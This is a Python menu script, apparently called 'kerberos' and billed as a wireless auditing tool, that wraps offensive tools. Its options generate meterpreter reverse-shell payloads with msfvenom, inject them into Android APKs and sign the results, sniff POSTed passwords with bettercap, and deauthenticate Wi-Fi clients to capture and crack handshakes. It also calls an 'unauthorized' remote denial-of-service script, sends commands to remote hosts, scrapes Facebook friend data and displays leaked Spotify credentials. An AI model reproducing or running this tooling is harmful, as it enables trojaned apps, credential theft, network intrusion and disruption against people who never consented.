import os
import time
import threading


def banner_kerberos():
    print('''\x1b[34m
    |  | |||| |||   ||||   ||||  |||      |^^^|     |||||| \x1b[34m
    | |  |    |  |  |   |  |     |  |    |     |    |      \x1b[34m
    ||   |    |   | |    | |     |   |  |       |  |       \x1b[34m
    ||   |||| ||||  ||||   ||||  ||||   |       |   |||||  \x1b[34m
    | |  |    |  |  |   |  |     |   |   |     |         | \x1b[34m
    |  | |||| |   | ||||   ||||  |    |   |___|    ||||||  \x1b[34m
    ''')


def colours(colour):
    black = '\x1b[30m'
    red = '\x1b[31m'
    green = '\x1b[32m'
    yellow = '\x1b[33m'
    blue = '\x1b[34m'
    magenta = '\x1b[35m'
    cyan = '\x1b[36m'
    white = '\x1b[37m'
    reset = '\x1b[0m'
    if colour == 'black':
        return black
    elif colour == 'red':
        return red
    elif colour == 'green':
        return green
    elif colour == 'yellow':
        return yellow
    elif colour == 'blue':
        return blue
    elif colour == 'magenta':
        return magenta
    elif colour == 'cyan':
        return cyan
    elif colour == 'white':
        return white
    elif colour == 'reset':
        return reset
    else:
        raise LookupError


def colours_background(colour):
    black = '\x1b[40m'
    red = '\x1b[41m'
    green = '\x1b[42m'
    yellow = '\x1b[43m'
    blue = '\x1b[44m'
    magenta = '\x1b[45m'
    cyan = '\x1b[46m'
    white = '\x1b[47m'
    reset = '\x1b[0m'
    if colour == 'black':
        return black
    elif colour == 'red':
        return red
    elif colour == 'green':
        return green
    elif colour == 'yellow':
        return yellow
    elif colour == 'blue':
        return blue
    elif colour == 'magenta':
        return magenta
    elif colour == 'cyan':
        return cyan
    elif colour == 'white':
        return white
    elif colour == 'reset':
        return reset
    else:
        raise LookupError


def colours_bright(colour):
    black = '\x1b[30;1m'
    red = '\x1b[31;1m'
    green = '\x1b[32;1m'
    yellow = '\x1b[33;1m'
    blue = '\x1b[34;1m'
    magenta = '\x1b[35;1m'
    cyan = '\x1b[36;1m'
    white = '\x1b[37;1m'
    reset = '\x1b[0m'
    if colour == 'black':
        return black
    elif colour == 'red':
        return red
    elif colour == 'green':
        return green
    elif colour == 'yellow':
        return yellow
    elif colour == 'blue':
        return blue
    elif colour == 'magenta':
        return magenta
    elif colour == 'cyan':
        return cyan
    elif colour == 'white':
        return white
    elif colour == 'reset':
        return reset
    else:
        raise LookupError


def colours_background_bright(colour):
    black = '\x1b[40;1m'
    red = '\x1b[41;1m'
    green = '\x1b[42;1m'
    yellow = '\x1b[43;1m'
    blue = '\x1b[44;1m'
    magenta = '\x1b[45;1m'
    cyan = '\x1b[46;1m'
    white = '\x1b[47;1m'
    reset = '\x1b[0m'
    if colour == 'black':
        return black
    elif colour == 'red':
        return red
    elif colour == 'green':
        return green
    elif colour == 'yellow':
        return yellow
    elif colour == 'blue':
        return blue
    elif colour == 'magenta':
        return magenta
    elif colour == 'cyan':
        return cyan
    elif colour == 'white':
        return white
    elif colour == 'reset':
        return reset
    else:
        raise LookupError


def gen_payload(LHOST, LPORT, payload, target, protocol):
    os.system(f'msfvenom -p {target}/meterpreter/{protocol} LHOST={LHOST} LPORT={LPORT} r>{payload}')


def authorized_dos(host):
    os.system(f'authorised_remote_dos.rb {host}')


def unauthorized_dos(ip, port):
    os.system(f'unauthorized_remote_dos.pl {ip} {port}')


def apk_embed(LHOST, LPORT, app):
    os.system(f'ruby apk-embed-payload.rb {app}.apk - p android/meterpreter/reverse_tcp LHOST ={LHOST} LPORT ={LPORT}')


def apk_sign(app):
    os.system(f'd2j-apk-sign {app}')


def sniffer(ip):
    os.system(f'bettercap -T {ip} --proxy -P POST')


def cracker(wordlist):
    os.system(f'aircrack-ng capture-01.cap -w {wordlist}')


def deauth(mac_ap, mac_client):
    os.system(f'aireplay-ng --deauth 0 -a {mac_ap} -c {mac_client} wlan0mon')


def fbi():
    os.system("pip2 install -r requirements.txt")
    print("[Warn] please turn off your VPN before using this program !!!")
    print(f"{colours_background('blue')} this script uses python2 {colours('green')} {colours('reset')}")
    os.system('python2 fbi.py')


def capture_handshake(mac_ap):
    os.system(f'airodump-ng -w capture -d {mac_ap} wlan0mon')


banner_kerberos()
print(f'''
hello there {os.getlogin()}: {colours('magenta')}
    Number one tool is the brain..some functions require you to be connected.{colours("magenta")}
    welcome to the wireless auditing tool {colours('magenta')}
    written by kerberos for linux {colours('magenta')}
    don't forget to run this script in root otherise some functions will fail {colours('magenta')}
    see our other projects at https://github.com/ApexDevs254 {colours('magenta')}
''')
status = True
while True:
    rep = int(input('''\x1b[34m What would you like to do  today 
    \x1b[32m
    1:generate payload \x1b[32m
    
    2:embed payload to android app \x1b[32m
    
    3:sign apk \x1b[32m
    
    4:sniff passwords over the network \x1b[32m
    
    5:crack wifi passwords \x1b[32m
    
    6:get facebook friends data \x1b[32m
    
    7:run server to receive commands from remote host \x1b[32m
    
    8:send commands to remote host \x1b[32m
    
    9:display leaked spotify accounts and their passwords \x1b[32m
    
    10:show license
    
    11:show requirements
    
    waiting> \x1b[31m'''))
    try:
        if rep == 1:
            print(f'''
            targets | android , windows
            {colours('blue')}--------------------------------------------- {colours('red')}
            protocols | reverse_tcp , reverse_http, reverse_https
            ''')
            gen_payload(LHOST=input('IP: '), LPORT=input('Port: '), payload=input('Payload name: '),
                        target=input("Target: "), protocol=input("protocol: "))
        elif rep == 2:
            apk_embed(LHOST=input('Enter ip to bind to: '), LPORT=input('enter port to bind to: '),
                      app=input('Enter name for apk to bind to: '))
        elif rep == 3:
            apk_sign(app=input('The directory for app to be signed and include filename: '))
        elif rep == 4:
            print('take note of ip address of target')
            os.system('bettercap --sniffer')
            time.sleep(10)
            sniffer(ip=input('Enter ip address of target: '))
        elif rep == 5:
                os.system('airmon-ng start wlan0')
                print("take note of the access point and any client on the network")
                print("after taking down the acess point and client hit ctrl+z")
                time.sleep(3)
                os.system('airodump-ng wlan0mon')
                print("wait..")
                time.sleep(2)
                mac_ap = input('enter mac of target: ')
                mac_client = input('enter mac of any device connected to the target: ')
                print("deauthentication and handshake capture will happen in the background")
                t1 = threading.Thread(target=deauth(mac_ap, mac_client))
                t2 = threading.Thread(target=capture_handshake(mac_ap))
                wordlist = input('enter path to wordlist including filename')
                t1.start()
                t2.start()
                cracker(wordlist)
        elif rep == 9:
            os.system('python3 spotify.py')

        elif rep == 7:
            print('[STARTING] server is starting...')
            os.system('python3 server.py')

        elif rep == 8:
            ip = input("host to connect to: ")
            ls = input("The command: ")
            os.system(f"python3 client.py {ip} {ls}")
        elif rep == 6:
            fbi()
        elif rep == 10:
            os.system("python license.o")
        elif rep == 11:
            print(f"dependencies:""{colours('blue')}"
                  "airmon-ng,airodump-ng,ruby,d2j-sign-apk,msvenom,bettercap")
        else:
            print('you made a wrong choice\x1b[31m')
    except ValueError:
        print('unsupported reply\x1b[31m')

# t1 = threading.Thread(target=wifi())
# t1.start()
